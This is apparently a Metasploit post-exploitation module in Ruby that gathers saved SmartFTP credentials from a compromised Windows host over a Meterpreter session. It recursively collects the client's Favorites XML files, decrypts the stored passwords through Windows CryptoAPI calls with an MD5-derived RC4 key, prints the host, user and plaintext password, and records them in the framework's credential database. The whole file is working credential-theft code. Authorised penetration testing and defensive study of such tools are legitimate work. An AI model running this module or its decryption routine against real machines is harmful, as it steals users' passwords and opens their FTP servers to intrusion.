##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather SmartFTP Saved Password Extraction',
        'Description' => %q{
          This module finds saved login credentials
          for the SmartFTP FTP client for windows.
          It finds the saved passwords and decrypts
          them.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'theLightCosine'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_railgun_api
            ]
          }
        }
      )
    )
  end

  def run
    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      tmpath = user['AppData'] + '\\SmartFTP\\Client 2.0\\Favorites'

      enum_subdirs(tmpath).each do |xmlfile|
        xml = get_xml(xmlfile)

        unless xml.nil?
          # Will report the creds to DB and user
          parse_xml(xml)
        end
      end
    end
  end

  # The saved connections in SmartFTP are saved in XML files saved
  # in a Directory with user-defineable sub-directories. This
  # function recursively searches all sub directories for the XML files
  def enum_subdirs(path)
    xmlfiles = []

    begin
      session.fs.dir.foreach(path) do |sub|
        next if sub =~ /^(\.|\.\.|Predefined Favorites)$/

        xmlpath = "#{path}\\#{sub}"

        if sub =~ /\.xml$/
          xmlfiles << xmlpath
        else
          xmlfiles += enum_subdirs(xmlpath)
        end
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Received error code #{e.code} when enumerating #{path}"
    end

    return xmlfiles
  end

  # We attempt to open the discovered XML files and alert the user if
  # we cannot access the file for any reason
  def get_xml(path)
    connections = client.fs.file.new(path, 'r')

    condata = ''
    condata << connections.read until connections.eof
    return condata
  rescue Rex::Post::Meterpreter::RequestError => e
    print_error "Received error code #{e.code} when reading #{path}"
    return nil
  end

  # Extracts the saved connection data from the XML. If no password
  # is saved, then we skip that connection. Reports the credentials
  # back to the database
  def parse_xml(data)
    mxml = REXML::Document.new(data).root
    mxml.elements.to_a('//FavoriteItem').each do |node|
      next if node.elements['Host'].nil?
      next if node.elements['User'].nil?
      next if node.elements['Password'].nil?

      host = node.elements['Host'].text
      port = node.elements['Port'].text
      user = node.elements['User'].text
      epassword = node.elements['Password'].text

      next if epassword.empty?

      pass = decrypt(epassword)

      print_good("HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}")

      service_data = {
        address: host,
        port: port,
        service_name: 'ftp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :password,
        private_data: pass,
        username: user
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      login_data.merge!(service_data)
      create_credential_login(login_data)
    end
  end

  # Hooks the Windows CryptoAPI libraries to decrypt the Passwords
  def decrypt(password)
    cipher = [password].pack('H*')
    ms_enhanced_prov = 'Microsoft Enhanced Cryptographic Provider v1.0'
    prov_rsa_full = 1
    crypt_verify_context = 0xF0000000
    alg_md5 = 32771
    alg_rc4 = 26625

    advapi32 = client.railgun.advapi32

    acquirecontext = advapi32.CryptAcquireContextW(4, nil, ms_enhanced_prov, prov_rsa_full, crypt_verify_context)
    createhash = advapi32.CryptCreateHash(acquirecontext['phProv'], alg_md5, 0, 0, 4)
    # hashdata = advapi32.CryptHashData(createhash['phHash'], 'SmartFTP', 16, 0)
    derivekey = advapi32.CryptDeriveKey(acquirecontext['phProv'], alg_rc4, createhash['phHash'], 0x00800000, 4)
    decrypted = advapi32.CryptDecrypt(derivekey['phKey'], 0, true, 0, cipher, cipher.length)
    # destroyhash = advapi32.CryptDestroyHash(createhash['phHash'])
    # destroykey = advapi32.CryptDestroyKey(derivekey['phKey'])
    # releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)

    data = decrypted['pbData']
    data.gsub!(/\x00/, '')
    return data
  end
end
